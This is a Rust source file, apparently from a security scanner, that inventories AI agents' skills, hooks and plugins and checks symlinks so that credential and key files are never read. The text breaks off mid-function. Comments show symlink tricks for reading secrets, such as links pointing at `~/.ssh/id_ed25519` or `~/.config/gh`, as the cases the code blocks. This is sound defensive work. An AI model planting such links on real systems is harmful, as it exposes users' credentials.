use crate::models::{AgentSkill, SkillDynamicCommand, SkillProvenance, SkillSymlink};
use crate::platform::PlatformInfo;
use crate::scanners::{read_bounded, sanitize_display, Scanner};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

pub struct SkillsScanner;

/// What the skill walk needs to know about installed plugins, read once per scan:
/// which marketplaces are Anthropic's, which cache directories are installed plugin
/// versions, and which plugins the user disabled.
#[derive(Default)]
pub struct PluginContext {
    home: PathBuf,
    plugins_dir: PathBuf,
    /// marketplace name -> official
    marketplaces: HashMap<String, bool>,
    /// (installPath, plugin, marketplace), installPath restricted to `<plugins>/cache/`.
    install_paths: Vec<(PathBuf, String, String)>,
    /// `plugin@marketplace` keys set to false in ~/.claude/settings.json enabledPlugins.
    disabled: HashSet<String>,
    /// HOME-derived paths the symlink judgement compares against, resolved on first use
    /// and then reused for every file of the scan (see [`ScanPaths`]).
    paths: std::sync::OnceLock<ScanPaths>,
}

/// The per-scan constants of the symlink judgement: the canonical HOME and the user's
/// skill areas ([`skill_areas`], lexical and canonical). Resolving them is ~60
/// `canonicalize` calls (one `readlink` per path component each); doing that for every
/// file of a 2,400-file plugin tree was 600,000 `readlink`s per scan.
///
/// TOCTOU: resolving these once per scan is no weaker than resolving them per file.
/// Neither was ever atomic with the read: a per-file `canonicalize(home)` could change
/// right after it returned just as a per-scan one can. What protects the read is that
/// each file is opened at its own real path with `O_NOFOLLOW` and the descriptor's path
/// checked against it ([`crate::scanners::read_bounded_nofollow`]); the file's own path
/// and a link's own target are still resolved per file.
struct ScanPaths {
    /// `canonicalize(HOME)`, or HOME normalised lexically when it does not resolve.
    real_home: PathBuf,
    /// [`skill_areas`] of HOME.
    areas: Vec<PathBuf>,
}

impl PluginContext {
    pub fn load(home: &Path) -> Self {
        let plugins_dir = home.join(".claude").join("plugins");
        let mut ctx = PluginContext { home: home.to_path_buf(), plugins_dir: plugins_dir.clone(), ..Default::default() };
        if let Some(text) = read_bounded(&plugins_dir.join("known_marketplaces.json"))
            && let Ok(json) = serde_json::from_str::<serde_json::Value>(&text)
            && let Some(obj) = json.as_object()
        {
            let parsed = crate::scanners::marketplaces::parse_marketplaces(&json, &HashMap::new());
            for name in obj.keys() {
                let shown = sanitize_display(name, 128);
                let official = parsed.iter().any(|m| m.name == shown && m.official);
                ctx.marketplaces.insert(name.clone(), official);
            }
        }
        let cache = plugins_dir.join("cache");
        if let Some(text) = read_bounded(&plugins_dir.join("installed_plugins.json"))
            && let Ok(json) = serde_json::from_str::<serde_json::Value>(&text)
        {
            for ((plugin, market), entries) in crate::scanners::marketplaces::installed_entries(&json) {
                for e in entries {
                    let Some(ip) = e.get("installPath").and_then(|v| v.as_str()) else { continue };
                    let ip = crate::scanners::persistence::lexical_join(Path::new("/"), Path::new(ip));
                    if ip.starts_with(&cache) && ip != cache {
                        ctx.install_paths.push((ip, plugin.clone(), market.clone()));
                    }
                }
            }
        }
        if let Some(text) = read_bounded(&home.join(".claude").join("settings.json"))
            && let Ok(json) = serde_json::from_str::<serde_json::Value>(&text)
            && let Some(obj) = json.get("enabledPlugins").and_then(|v| v.as_object())
        {
            for (k, v) in obj {
                if v.as_bool() == Some(false) {
                    ctx.disabled.insert(k.clone());
                }
            }
        }
        ctx
    }

    /// The scan's HOME-derived paths, resolved once.
    fn paths(&self) -> &ScanPaths {
        self.paths.get_or_init(|| {
            let real_home = canon_or_lexical(&self.home);
            let areas = skill_areas(&self.home, &real_home);
            ScanPaths { real_home, areas }
        })
    }

    /// Installed plugin versions: (installPath, plugin, marketplace), under `cache/`.
    pub(crate) fn install_paths(&self) -> &[(PathBuf, String, String)] {
        &self.install_paths
    }

    /// Provenance of a path under `~/.claude/plugins` or `~/.claude/skills/synced`.
    pub(crate) fn provenance(&self, path: &Path) -> Option<SkillProvenance> {
        let synced_root = self.home.join(".claude").join("skills").join("synced");
        if path.starts_with(&synced_root) {
            return Some(SkillProvenance { synced: true, ..Default::default() });
        }
        let rel = path.strip_prefix(&self.plugins_dir).ok()?;
        let comps: Vec<&str> = rel.components().filter_map(|c| c.as_os_str().to_str()).collect();
        let (market, plugin) = match comps.as_slice() {
            ["cache", m, p, _, ..] => (m.to_string(), Some(p.to_string())),
            ["marketplaces", m, _, ..] => (m.to_string(), None),
            _ => return Some(SkillProvenance::default()),
        };
        // Fail closed (review of b9cda85): a marketplace is official only when
        // known_marketplaces.json registers it with an official source. One missing from
        // that file (deleted, or never registered: `installed_plugins.json` naming
        // `tp@some-market`) is third-party, so its hooks are graded, not silenced.
        let third_party = !self.marketplaces.get(&market).copied().unwrap_or(false);
        let lexical = crate::scanners::persistence::lexical_join(Path::new("/"), path);
        // Active: inside an installed version's directory, and not disabled. Marketplace
        // clones and orphaned cache versions never load.
        let active = plugin.as_ref().is_some_and(|p| {
            self.install_paths.iter().any(|(ip, ipp, ipm)| {
                ipp == p && *ipm == market && lexical.starts_with(ip)
            }) && !self.disabled.contains(&format!("{p}@{market}"))
        });
        Some(SkillProvenance {
            marketplace: Some(sanitize_display(&market, 128)),
            plugin: plugin.map(|p| sanitize_display(&p, 128)),
            third_party,
            active,
            git: None,
            synced: false,
        })
    }

    /// For a link with no SKILL.md ancestor in the plugins walk: the plugin root
    /// (`cache/<m>/<p>/<v>` or `marketplaces/<m>`).
    fn plugin_root(&self, path: &Path) -> Option<PathBuf> {
        let rel = path.strip_prefix(&self.plugins_dir).ok()?;
        let comps: Vec<&str> = rel.components().filter_map(|c| c.as_os_str().to_str()).collect();
        match comps.as_slice() {
            ["cache", m, p, v, _, ..] => Some(self.plugins_dir.join("cache").join(m).join(p).join(v)),
            ["marketplaces", m, _, ..] => Some(self.plugins_dir.join("marketplaces").join(m)),
            _ => None,
        }
    }
}

impl Scanner for SkillsScanner {
    type Output = Vec<AgentSkill>;

    fn scan(&self, platform: &dyn PlatformInfo) -> Self::Output {
        let home = platform.home_dir();
        crate::scanners::hook_sources::reset_scan_budget();
        let ctx = PluginContext::load(&home);
        let mut results = Vec::new();

        // Claude Code custom commands: ~/.claude/commands/
        let global_commands = home.join(".claude").join("commands");
        walk_span("commands", "global", &mut results, |r| {
            scan_skill_dir(&global_commands, "claude-code", "global", None, &ctx, r)
        });

        // Known projects plus the current directory. HOME (or an ancestor) registered as a
        // project is left out: its .claude is the global config walked above and below.
        let mut project_dirs = extract_project_dirs(&home.join(".claude.json")).unwrap_or_default();
        if let Ok(cwd) = std::env::current_dir() {
            project_dirs.push(cwd);
        }
        let project_dirs = project_dirs_excluding_home(project_dirs, &home);
        // Each project with the root its skills are contained in: the enclosing git work
        // tree (a monorepo app registered at mono/apps/web shares skills from mono/shared).
        let project_dirs: Vec<(PathBuf, PathBuf)> =
            project_dirs.into_iter().map(|d| (project_containment_root(&d, &home), d)).collect();
        // A count only: a project's path or position is never exported.
        crate::otel::annotate_current(|| {
            vec![crate::otel::Attr::int(crate::otel::Key::SkillsProjects, project_dirs.len() as i64)]
        });

        // Claude Code project commands
        for (root, dir) in &project_dirs {
            let project_commands = dir.join(".claude").join("commands");
            walk_span("commands", "project", &mut results, |r| {
                scan_skill_dir(&project_commands, "claude-code", "project", Some(root), &ctx, r)
            });
        }

        // Claude Code subagents: ~/.claude/agents/*.md and <proj>/.claude/agents/*.md, whose
        // frontmatter may declare hooks. Plugin agents are not walked: Claude Code ignores
        // their hooks (code.claude.com/docs/en/sub-agents).
        walk_span("agents", "global", &mut results, |r| {
            scan_agents_tree(&home.join(".claude").join("agents"), "global", None, &ctx, r)
        });
        for (root, dir) in &project_dirs {
            walk_span("agents", "project", &mut results, |r| {
                scan_agents_tree(&dir.join(".claude").join("agents"), "project", Some(root), &ctx, r)
            });
        }

        // Claude Code hooks: ~/.claude/hooks/ and project-level .claude/hooks/
        let global_hooks = home.join(".claude").join("hooks");
        walk_span("hooks", "global", &mut results, |r| {
            scan_skill_dir(&global_hooks, "claude-code-hook", "global", None, &ctx, r)
        });

        // Codex hooks from ~/.codex/
        let codex_dir = home.join(".codex");
        if crate::scanners::probe_dir(&codex_dir) {
            walk_span("codex", "global", &mut results, |r| scan_skill_dir(&codex_dir, "codex", "global", None, &ctx, r));
        }

        // Skill BUNDLES (SKILL.md + sibling scripts), which the flat walk above cannot
        // see. `plugins/` covers the marketplace -> plugin -> skill chain: marketplaces
        // are already inventoried as a remote hot-load surface, but the skills they
        // actually install were never walked.
        walk_span("skills", "global", &mut results, |r| {
            scan_skill_bundles(&home.join(".claude").join("skills"), "claude-code", "global", None, &ctx, r)
        });
        walk_span("plugins", "global", &mut results, |r| {
            scan_skill_bundles(&home.join(".claude").join("plugins"), "claude-code-plugin", "global", None, &ctx, r)
        });
        for (root, dir) in &project_dirs {
            walk_span("skills", "project", &mut results, |r| {
                scan_skill_bundles(&dir.join(".claude").join("skills"), "claude-code", "project", Some(root), &ctx, r)
            });
        }

        // Dedupe by scope and path, with the DIRECTORY canonicalized (not the file: two
        // links to one target are two skills). HOME and its ancestors are never walked as
        // a project (project_dirs_excluding_home), so a global and a project entry with
        // one key are two loading surfaces joined by a link: a repository's
        // `.claude/commands -> ~/...` must not be hidden behind the user's own entry.
        dedupe_results(&mut results);
        // Deduped on the raw path above; the report carries it sanitized (skill and
        // project directory names are attacker-chosen text: ESC, OSC, newlines).
        for r in &mut results {
            r.path = sanitize_display(&r.path, 512);
        }

        results
    }
}

/// Counters for the `skills.walk` span of the walk in progress. Scanners run on one
/// thread, one walk at a time; [`walk_span`] resets them before the walk and reads them
/// after. Updated only when export is on: off, each update is one relaxed load.
#[derive(Clone, Copy, Default)]
struct WalkCounts {
    /// Directory entries visited.
    entries: u64,
    /// Bytes of file content hashed into an inventory entry's sha256.
    bytes_hashed: u64,
    /// A file, entry or subdirectory budget stopped the walk early.
    budget_exhausted: bool,
    /// How the walk root was judged (`plain` | `followed` | `refused`); the first
    /// judgement of the walk, which is its root's.
    root_link: Option<&'static str>,
}

thread_local! {
    static WALK: std::cell::Cell<WalkCounts> = std::cell::Cell::new(WalkCounts::default());
}

fn walk_note(f: impl FnOnce(&mut WalkCounts)) {
    if !crate::otel::enabled() {
        return;
    }
    WALK.with(|c| {
        let mut w = c.get();
        f(&mut w);
        c.set(w);
    });
}

fn note_root_link(link: &RootLink) {
    let label = match link {
        RootLink::Plain => "plain",
        RootLink::Follow(_) => "followed",
        RootLink::Refuse(_) => "refused",
    };
    walk_note(|w| {
        w.root_link.get_or_insert(label);
    });
}

/// Run one walk under a `skills.walk` span. Attributes are closed values and counts:
/// the walk kind, its scope, how its root was judged, entries visited, files read (the
/// shared reader's counter), bytes hashed, hooks found, and whether a budget ran out.
/// A project walk carries no path and no project index.
fn walk_span(
    kind: &'static str,
    scope: &'static str,
    results: &mut Vec<AgentSkill>,
    f: impl FnOnce(&mut Vec<AgentSkill>),
) {
    use crate::otel::{Attr, Key};
    if !crate::otel::enabled() {
        f(results);
        return;
    }
    let before = results.len();
    let (read0, _) = crate::scanners::telemetry::snapshot();
    WALK.with(|c| c.set(WalkCounts::default()));
    let mut span = crate::otel::span("skills.walk", || {
        vec![Attr::str(Key::WalkKind, kind), Attr::str(Key::WalkScope, scope)]
    });
    f(results);
    let w = WALK.with(|c| c.get());
    let files = crate::scanners::telemetry::snapshot().0 - read0;
    let hooks: usize = results[before..].iter().map(|r| r.hooks.len()).sum();
    span.set(|| {
        vec![
            Attr::str(Key::WalkRootLink, w.root_link.unwrap_or("plain")),
            Attr::int(Key::WalkEntries, w.entries as i64),
            Attr::int(Key::WalkFiles, files as i64),
            Attr::int(Key::WalkBytesHashed, w.bytes_hashed as i64),
            Attr::int(Key::WalkHooks, hooks as i64),
            Attr::bool(Key::WalkBudgetExhausted, w.budget_exhausted),
            Attr::int(Key::Items, (results.len() - before) as i64),
        ]
    });
}

/// `path` with its parent directory canonicalized, so the same file reached through a
/// symlinked HOME or project directory is recognised as one entry.
pub(crate) fn dedupe_key(path: &Path) -> PathBuf {
    match (path.parent().and_then(|p| canonicalize(p).ok()), path.file_name()) {
        (Some(dir), Some(name)) => dir.join(name),
        _ => path.to_path_buf(),
    }
}

/// The scan's dedupe (see [`SkillsScanner::scan`]): by scope and [`dedupe_key`], with each
/// parent directory canonicalized once rather than once per entry.
fn dedupe_results(results: &mut Vec<AgentSkill>) {
    let mut cache = WalkCache::default();
    let mut seen = HashSet::new();
    results.retain(|r| {
        let path = Path::new(&r.path);
        let key = match (path.parent().and_then(|p| cache.canon(p)), path.file_name()) {
            (Some(dir), Some(name)) => dir.join(name),
            _ => path.to_path_buf(),
        };
        seen.insert((r.scope.clone(), key))
    });
}

/// Project directories worth walking as "project" content: not HOME itself or an
/// ancestor of it (its `.claude` IS the user's global config, walked with the user's
/// policy), compared canonically so a symlinked HOME is caught too. Shared with the
/// gitconfig scanner, which does not walk HOME for nested git dirs either.
pub(crate) fn project_dirs_excluding_home(dirs: Vec<PathBuf>, home: &Path) -> Vec<PathBuf> {
    let real_home = canon_or_lexical(home);
    dirs.into_iter()
        .filter(|d| {
            let real = canon_or_lexical(d);
            !real_home.starts_with(&real) && !home.starts_with(d)
        })
        .collect()
}

/// The root a project's skill links are contained in, and whose `.git` answers their
/// provenance: the enclosing git work tree (the nearest ancestor of `dir` with a `.git`
/// entry, checked by existence only), so a monorepo app registered at `mono/apps/web`
/// may link `mono/shared/skills/lint` and have it read and analysed. HOME and its
/// ancestors are never a containment root (a dotfiles repository at `~/.git` would make
/// every file under HOME "inside the project"); without a repository it is `dir` itself.
pub(crate) fn project_containment_root(dir: &Path, home: &Path) -> PathBuf {
    let real_home = canon_or_lexical(home);
    for a in dir.ancestors() {
        if home.starts_with(a) || real_home.starts_with(a) {
            break;
        }
        if std::fs::symlink_metadata(a.join(".git")).is_ok() {
            return a.to_path_buf();
        }
    }
    dir.to_path_buf()
}

/// Cap on qualifying files (manifests, commands, scripts) per bundle walk.
const MAX_BUNDLE_FILES: usize = 5_000;
/// Cap on directory entries visited per bundle walk, so a pathological tree can't hang
/// the scan. Counted separately from qualifying files: on a real machine the plugin tree
/// holds ~5,000 non-skill files (docs, images, test data), and a single shared budget
/// ran out before the walk reached the installed plugin cache.
const MAX_BUNDLE_ENTRIES: usize = 50_000;
/// Frontmatter larger than this is not parsed.
const MAX_FRONTMATTER: usize = 16 * 1024;
/// Dynamic commands kept per file.
const MAX_DYNAMIC_COMMANDS: usize = 50;

/// Agent-config directories a skill link may legitimately point into (one skill
/// reusing another, a plugin's own files): not "sensitive" for the symlink check.
const SKILL_LINK_OK_DIRS: &[&str] = &["skills", "commands", "plugins", "agents", "hooks"];

/// Other agents' homes whose skill, command and prompt directories hold skills, not
/// agent configuration. Keeping one skill set and linking it into each agent
/// (`~/.claude/skills/x -> ~/.codex/skills/x`) is a common setup: the target is another
/// SKILL.md, so the rest of these homes (settings, auth files) stays sensitive but these
/// subdirectories do not.
const OTHER_AGENT_HOMES: &[&str] = &[
    ".codex", ".cursor", ".gemini", ".kiro", ".windsurf", ".codeium/windsurf", ".agents", ".copilot",
    ".config/opencode", ".opencode", ".continue", ".roo", ".cline", ".factory", ".config/amp",
    ".config/goose", ".qwen", ".augment",
];
const OTHER_AGENT_SKILL_DIRS: &[&str] = &["skills", "commands", "prompts"];

/// The user's skill areas, lexical and canonical: `~/.claude/{skills,commands,plugins,
/// agents,hooks}` and the skill/command/prompt directories of other agents' homes.
///
/// A canonical form reached through a link counts only when it is still a skills/commands
/// directory or is not itself a sensitive path: `~/.claude/commands -> ~/.config/gh` must
/// not make the gh credential directory a "skill area" (review round 6), while
/// `~/.claude -> ~/.config/claude` keeps `~/.config/claude/commands`.
fn skill_areas(home: &Path, real_home: &Path) -> Vec<PathBuf> {
    let claude = SKILL_LINK_OK_DIRS.iter().map(|d| home.join(".claude").join(d));
    let others = OTHER_AGENT_HOMES
        .iter()
        .flat_map(|a| OTHER_AGENT_SKILL_DIRS.iter().map(move |d| home.join(a).join(d)));
    claude
        .chain(others)
        .flat_map(|l| {
            let canon = canon_or_lexical(&l);
            let unlinked = l.strip_prefix(home).is_ok_and(|r| real_home.join(r) == canon);
            let keep = unlinked
                || canon.file_name() == l.file_name()
                || !crate::scanners::persistence::is_sensitive_read_target(&canon, real_home);
            keep.then_some(canon).into_iter().chain([l])
        })
        .collect()
}

/// What a walk root (`~/.claude/commands`, `~/.claude/skills`, `~/.codex`,
/// `proj/.claude/skills`) resolves to.
enum RootLink {
    /// No symlink between the root and its base (HOME, or the project directory).
    Plain,
    /// Walk it; every file found under it records this (target: the file's real path).
    Follow(SkillSymlink),
    /// Do not list or read it: inventory one directory-level entry with this.
    Refuse(SkillSymlink),
}

/// Judge a walk root that is a symlink, or whose path crosses one below its base, on its
/// canonical path with the [`skill_dir_link`] rules (review round 6): a root that lands
/// in a credential, key, agent-config, system or other-user path that is not a skill area
/// (`ln -s ~/.config/gh ~/.claude/commands`) is never listed or read (High); one that is
/// or contains HOME is never walked; a project's root is walked only inside its
/// repository; the user's own linked root (a dotfiles-managed `~/.claude/commands`) is
/// walked, and each file under it records the link.
fn judge_walk_root(root: &Path, scope: &str, project_root: Option<&Path>, ctx: &PluginContext) -> RootLink {
    use crate::scanners::persistence::{is_sensitive_read_target, lexical_join};
    let home = ctx.home.as_path();
    let project = scope == "project";
    // Project roots are `<dir>/.claude/<x>`; global roots are under HOME.
    let Some(base) = (if project { root.parent().and_then(Path::parent) } else { Some(home) }) else {
        return RootLink::Plain;
    };
    let Ok(rel) = root.strip_prefix(base) else { return RootLink::Plain };
    let mut cur = base.to_path_buf();
    let mut lexical = base.to_path_buf();
    let mut linked = false;
    for c in rel.components() {
        cur.push(c);
        // read_link succeeds only on a symlink; existence only, nothing is opened.
        match std::fs::read_link(&cur) {
            Ok(t) => {
                linked = true;
                lexical = lexical_join(&lexical, &t);
            }
            Err(_) => lexical.push(c),
        }
    }
    if !linked {
        return RootLink::Plain;
    }
    let Ok(real) = canonicalize(root) else { return RootLink::Plain };
    let ScanPaths { real_home, areas } = ctx.paths();
    let in_area = |p: &Path| areas.iter().any(|a| p.starts_with(a));
    let repo = project_root.filter(|_| project).map(canon_or_lexical);
    let in_repo = |p: &Path| repo.as_ref().is_some_and(|r| p.starts_with(r) && !real_home.starts_with(r));
    let sensitive = (!in_area(&real) && !in_repo(&real) && is_sensitive_read_target(&real, real_home))
        || (!in_area(&lexical) && !in_repo(&lexical) && is_sensitive_read_target(&lexical, home));
    let kind = read_kind(&lexical, home, &real, real_home);
    let info = |escapes: bool, sensitive_target: bool, followed: bool| SkillSymlink {
        target: sanitize_display(&real.to_string_lossy(), 300),
        escapes,
        sensitive_target,
        sensitive_kind: kind.filter(|_| sensitive_target),
        followed,
        store: real.starts_with("/nix/store"),
        through_directory: true,
        dangling: false,
    };
    if sensitive {
        return RootLink::Refuse(info(true, true, false));
    }
    if real_home.starts_with(&real) {
        return RootLink::Refuse(info(true, false, false));
    }
    if project && !in_repo(&real) {
        return RootLink::Refuse(info(true, false, false));
    }
    RootLink::Follow(info(false, false, true))
}

/// The kind of sensitive path a link reaches (see
/// [`crate::scanners::persistence::sensitive_read_kind`]), judged on the lexical target
/// against HOME and on the real path against the canonical HOME; the most specific wins.
fn read_kind(lexical: &Path, home: &Path, real: &Path, real_home: &Path) -> Option<String> {
    use crate::scanners::persistence::{sensitive_read_kind, worst_read_kind};
    worst_read_kind([sensitive_read_kind(lexical, home), sensitive_read_kind(real, real_home)]).map(String::from)
}

/// The directory-level entry for a refused walk root: no listing, no read, no hash.
fn refused_root_entry(
    root: &Path,
    info: SkillSymlink,
    framework: &str,
    scope: &str,
    project_root: Option<&Path>,
    ctx: &PluginContext,
) -> AgentSkill {
    let name = root.file_name().and_then(|n| n.to_str()).unwrap_or("unknown").to_string();
    let read = SkillRead { content: None, symlink: Some(info) };
    build_skill(root, name, "directory".into(), false, read, framework, scope, project_root, ctx)
}

/// A file found under a followed linked walk root records the root's link, with the
/// file's own real path as the target.
fn record_root_link(read: &mut SkillRead, path: &Path, info: &SkillSymlink) {
    if read.symlink.is_none() {
        let real = canonicalize(path).map(|r| r.to_string_lossy().to_string()).unwrap_or_default();
        read.symlink = Some(SkillSymlink { target: sanitize_display(&real, 300), ..info.clone() });
    }
}

/// What reading one skill file produced.
struct SkillRead {
    content: Option<String>,
    symlink: Option<SkillSymlink>,
}

/// `std::fs::canonicalize`, the one path resolution of this module (one `readlink` per
/// component). Tests count the calls on their own thread, so the regression test can
/// hold the walk to O(directories) resolutions rather than O(files).
fn canonicalize(p: &Path) -> std::io::Result<PathBuf> {
    #[cfg(test)]
    RESOLUTIONS.with(|c| c.set(c.get() + 1));
    std::fs::canonicalize(p)
}

#[cfg(test)]
thread_local! {
    static RESOLUTIONS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
}

/// The canonical form of `p`, or its lexical normalisation when it does not resolve.
fn canon_or_lexical(p: &Path) -> PathBuf {
    canonicalize(p).unwrap_or_else(|_| crate::scanners::persistence::lexical_join(Path::new("/"), p))
}

/// Resolutions memoised for one walk: every file in a directory shares its directory's
/// canonical path, its skill directory and its containment and plugin roots, so those are
/// resolved once per directory, not once per file. Lives for one walk (one
/// [`scan_skill_bundles`] or [`scan_skill_dir`] call, or the scan's final dedupe); the
/// TOCTOU argument is the one at [`ScanPaths`].
#[derive(Default)]
struct WalkCache {
    /// Directory -> `canonicalize(directory)` (None when it did not resolve).
    canon: HashMap<PathBuf, Option<PathBuf>>,
    /// A file's parent directory -> [`skill_dir_of`] of a file in it.
    skill_dir: HashMap<PathBuf, Option<PathBuf>>,
}

impl WalkCache {
    /// `canonicalize(dir)`, memoised.
    fn canon(&mut self, dir: &Path) -> Option<PathBuf> {
        if let Some(r) = self.canon.get(dir) {
            return r.clone();
        }
        let r = canonicalize(dir).ok();
        self.canon.insert(dir.to_path_buf(), r.clone());
        r
    }

    /// [`canon_or_lexical`], memoised.
    fn canon_or_lexical(&mut self, p: &Path) -> PathBuf {
        self.canon(p).unwrap_or_else(|| crate::scanners::persistence::lexical_join(Path::new("/"), p))
    }

    /// The real path of a file the walk saw as NOT a symlink (`symlink_metadata`): its
    /// parent's real path joined with its name, which is what `canonicalize(path)`
    /// returns for a non-link. A link is never passed here: its target is resolved per
    /// file.
    fn real_path_of_non_link(&mut self, path: &Path) -> Option<PathBuf> {
        let (parent, name) = (path.parent()?, path.file_name()?);
        Some(self.canon(parent)?.join(name))
    }

    /// [`skill_dir_of`], memoised by the file's parent directory (`root` is fixed for a
    /// walk).
    fn skill_dir_of(&mut self, path: &Path, root: &Path) -> Option<PathBuf> {
        let Some(parent) = path.parent() else { return skill_dir_of(path, root) };
        if let Some(r) = self.skill_dir.get(parent) {
            return r.clone();
        }
        let r = skill_dir_of(path, root);
        self.skill_dir.insert(parent.to_path_buf(), r.clone());
        r
    }
}

#[cfg(unix)]
fn owned_by_current_user(p: &Path) -> bool {
    use std::os::unix::fs::MetadataExt;
    // SAFETY: geteuid has no preconditions and cannot fail.
    let me = unsafe { libc::geteuid() };
    std::fs::metadata(p).is_ok_and(|m| m.uid() == me)
}

#[cfg(not(unix))]
fn owned_by_current_user(_p: &Path) -> bool {
    true
}

/// Extensions a link's TARGET must have to be read: the skill-file types the walks look
/// for. A link that lands on anything else (`~/.cache/huggingface/token`, a `.yml`
/// config, a key) is inventoried without being read, even when it is not on any
/// credential list: reading it would put its hash in the report.
const SKILL_TARGET_EXTS: &[&str] = &["md", "markdown", "sh", "bash", "py", "js", "mjs", "ts"];

fn has_skill_ext(p: &Path) -> bool {
    p.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| SKILL_TARGET_EXTS.iter().any(|x| e.eq_ignore_ascii_case(x)))
}

/// The user's own link may be read in their own files only where skills plausibly live:
/// a directory that itself holds a SKILL.md (a dotfiles or XDG skill bundle), or a path
/// under HOME with no dot-directory in it (`~/dotfiles/claude/notes.md`). Dot-directories
/// (`~/.cache`, `~/.config/<tool>`, `~/.local/share`) are where tools keep their state and
/// tokens, so a link into one is not followed unless it is a skill bundle, a dotfile
/// manager's source tree, or a git checkout.
///
/// Dotfile managers keep the real files under a dot-directory and link them into place:
/// GNU stow in `~/.dotfiles/<pkg>/.claude/commands/review.md`, chezmoi in
/// `~/.local/share/chezmoi/dot_claude/...`, homeshick in `~/.homesick/repos/...`. A
/// command file or bundled script there has no SKILL.md beside it, so those roots, and
/// any directory under HOME inside a git checkout (a `.git` entry on the way up, checked
/// by existence only), count as the user's own skill files. The credential and
/// agent-config rules have already refused anything sensitive before this is asked.
fn user_link_target_ok(real: &Path, real_home: &Path) -> bool {
    if real.parent().is_some_and(|d| std::fs::symlink_metadata(d.join("SKILL.md")).is_ok()) {
        return true;
    }
    let Ok(rel) = real.strip_prefix(real_home) else { return false };
    let dirs: Vec<_> = rel.parent().map(|p| p.components().collect()).unwrap_or_default();
    if !dirs.iter().any(|c| c.as_os_str().to_str().is_none_or(|s| s.starts_with('.'))) {
        return true;
    }
    // `~/.local/bin` is the XDG location of the user's own scripts, not tool state.
    const DOTFILE_ROOTS: &[&str] = &[
        ".dotfiles", ".dots", ".local/share/chezmoi", ".homesick/repos", ".config/dotfiles", ".config/yadm",
        ".local/share/yadm", ".local/bin",
    ];
    if DOTFILE_ROOTS.iter().any(|r| rel.starts_with(r)) {
        return true;
    }
    real.ancestors()
        .skip(1)
        .take_while(|d| *d != real_home && d.starts_with(real_home))
        .any(|d| std::fs::symlink_metadata(d.join(".git")).is_ok())
}

/// Read a skill file without letting a symlink take the read somewhere it must not go.
///
/// The decision is made on the file's REAL path (`fs::canonicalize`, every hop and every
/// directory symlink resolved), and on the link's lexical target too, so neither a second
/// hop (`SKILL.md -> /tmp/x -> ~/.ssh/id_ed25519`) nor a symlinked directory in the chain
/// (`keys -> ~/.ssh`, `SKILL.md -> keys/id_ed25519`) gets past it. The file is then
/// opened at that real path with `O_NOFOLLOW` and the opened descriptor's path checked
/// against it, so a swap between the check and the read is refused, not followed.
///
/// Policy, by who authored the link:
/// - a target whose NAME is a credential, key, `.env` or shell-rc/history file is never
///   read, wherever it is (inside the repository, the plugin or a skill area too);
/// - outside the skill directory / repository / plugin root, a credential, keyring,
///   agent-settings, system or other-user path is never read either (`sensitive_target`,
///   High);
/// - a target that is not a skill-file type (SKILL_TARGET_EXTS) is never read;
/// - inside the skill's own directory (for a project: the repository; for a plugin: its
///   install or clone root), or inside the user's own skill areas
///   (`~/.claude/{skills,commands,plugins,agents,hooks}`, and the skills/commands/prompts
///   directories of other agents' homes, see [`skill_areas`]): read;
/// - the user's own links (`repo_root` None) may also point at their own files under HOME
///   where skills plausibly live (see [`user_link_target_ok`]);
/// - `/nix/store` (home-manager): read, inventory only;
/// - anything else is inventoried without being read.
///
/// CVE-2026-103435 class (c_h4ck_0, edbr): never read through into credential or
/// agent-config paths.
fn read_skill_file(
    path: &Path,
    is_link: bool,
    containment: &Path,
    repo_root: Option<&Path>,
    ctx: &PluginContext,
    cache: &mut WalkCache,
) -> Option<SkillRead> {
    use crate::scanners::persistence::{is_sensitive_read_name, is_sensitive_read_target, lexical_join};
    let home = ctx.home.as_path();
    let ScanPaths { real_home, areas } = ctx.paths();
    let real_home = real_home.as_path();
    let in_skill_area = |p: &Path| areas.iter().any(|a| p.starts_with(a));
    // The content's own tree: the skill directory, plus the repository or plugin root. A
    // tree that contains HOME is never "own" (a project registered at ~ would otherwise
    // let its links read anything under HOME).
    let own_roots: Vec<PathBuf> = [Some(containment), repo_root]
        .into_iter()
        .flatten()
        .flat_map(|r| [r.to_path_buf(), cache.canon_or_lexical(r)])
        .filter(|r| !home.starts_with(r) && !real_home.starts_with(r))
        .collect();
    let inside_own = |p: &Path| own_roots.iter().any(|r| p.starts_with(r));
    let sensitive_at = |p: &Path, h: &Path| {
        is_sensitive_read_name(p) || (!in_skill_area(p) && !inside_own(p) && is_sensitive_read_target(p, h))
    };
    let read = |r: &Path| crate::scanners::read_bounded_nofollow(r, Some(r));

    if !is_link {
        // A regular file reached through a symlinked directory (the walk root, or a
        // followed top-level skill directory link). The user's own roots (a
        // dotfiles-managed ~/.claude/commands) are theirs to link; a repository's are
        // checked.
        let Some(repo) = repo_root else {
            // Opened at its real path without following; a credential NAME (`.env`,
            // `credentials.json`, a key) is never opened, wherever the walk found it.
            let real = cache.real_path_of_non_link(path)?;
            let content = if is_sensitive_read_name(&real) { None } else { read(&real) };
            return Some(SkillRead { content, symlink: None });
        };
        let real = cache.real_path_of_non_link(path)?;
        if real.starts_with(cache.canon_or_lexical(repo)) {
            return Some(SkillRead { content: read(&real), symlink: None });
        }
        let sensitive = sensitive_at(&real, real_home);
        return Some(SkillRead {
            content: None,
            symlink: Some(SkillSymlink {
                target: sanitize_display(&real.to_string_lossy(), 300),
                escapes: true,
                sensitive_target: sensitive,
                sensitive_kind: read_kind(&real, real_home, &real, real_home).filter(|_| sensitive),
                followed: false,
                through_directory: true,
                ..Default::default()
            }),
        });
    }

    let target = std::fs::read_link(path).ok()?;
    let shown = sanitize_display(&target.to_string_lossy(), 300);
    let lexical = lexical_join(path.parent().unwrap_or(containment), &target);
    // The link's own target: resolved per file, every hop.
    let real = canonicalize(path).ok();
    let sensitive = sensitive_at(&lexical, home) || real.as_ref().is_some_and(|r| sensitive_at(r, real_home));
    if sensitive {
        let inside = inside_own(&lexical) && real.as_ref().is_none_or(|r| inside_own(r));
        return Some(SkillRead {
            content: None,
            symlink: Some(SkillSymlink {
                target: shown,
                escapes: !inside,
                sensitive_target: true,
                sensitive_kind: read_kind(&lexical, home, real.as_deref().unwrap_or(&lexical), real_home),
                followed: false,
                ..Default::default()
            }),
        });
    }
    // Dangling or looping: nothing to read, but the link itself is inventoried with its
    // text, and whether it leaves its skill directory is judged lexically.
    let Some(real) = real else {
